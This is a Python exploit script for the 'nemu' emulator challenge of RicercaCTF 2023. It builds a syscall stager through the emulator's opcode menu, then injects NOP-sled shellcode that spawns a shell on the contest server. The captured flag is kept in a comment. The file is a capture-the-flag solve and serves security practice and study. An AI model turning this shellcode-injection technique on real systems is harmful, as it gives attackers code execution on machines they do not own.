#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'nemu.2023.ricercactf.com', 'port':9002})
env.select()

#==========

binf = ELF(bin_file)

#==========

def attack(conn, **kwargs):
    nm = Nemu(conn)

    shellasm  = '''
    xchg rdi, rsi
    mov dh, 0x10
    xor rax, rax
    syscall
    '''
    shellcode = asm(shellasm)
    split_sc = list(map(u, split_n(shellcode, 4)))

    nm.load(split_sc[1])
    nm.mov(3)

    nm.load(split_sc[2])
    nm.mov(2)

    nm.load(u(asm('jmp rax')) << 16)
    nm.mov(1)
    for _ in range(16):
        nm.dbl(1)

    nm.load(split_sc[0])

    nm.add(0)

    shellasm  = 'nop;'*0x10
    shellasm += shellcraft.sh()
    shellcode = asm(shellasm)
    conn.send(shellcode)

class Nemu:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def load(self, val):
        self.sendlineafter(b'opcode: ', b'1')
        self.sendlineafter(b'operand: ', '#{}'.format(val).encode())

    def mov(self, reg):
        self.sendlineafter(b'opcode: ', b'2')
        self.sendlineafter(b'operand: ', 'r{}'.format(reg).encode())

    def inc(self, reg):
        self.sendlineafter(b'opcode: ', b'3')
        self.sendlineafter(b'operand: ', 'r{}'.format(reg).encode())

    def dbl(self, reg):
        self.sendlineafter(b'opcode: ', b'4')
        self.sendlineafter(b'operand: ', 'r{}'.format(reg).encode())

    def addi(self, val):
        self.sendlineafter(b'opcode: ', b'5')
        self.sendlineafter(b'operand: ', '#{}'.format(val).encode())

    def add(self, reg):
        self.sendlineafter(b'opcode: ', b'6')
        self.sendlineafter(b'operand: ', 'r{}'.format(reg).encode())

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag-66c43fe859fb1b3af1c8d7f2aa4e98d3.txt
    # RicSec{me0w_i_am_n3mu_n3mu_c4tt0}

if __name__=='__main__':
    main()

#==========
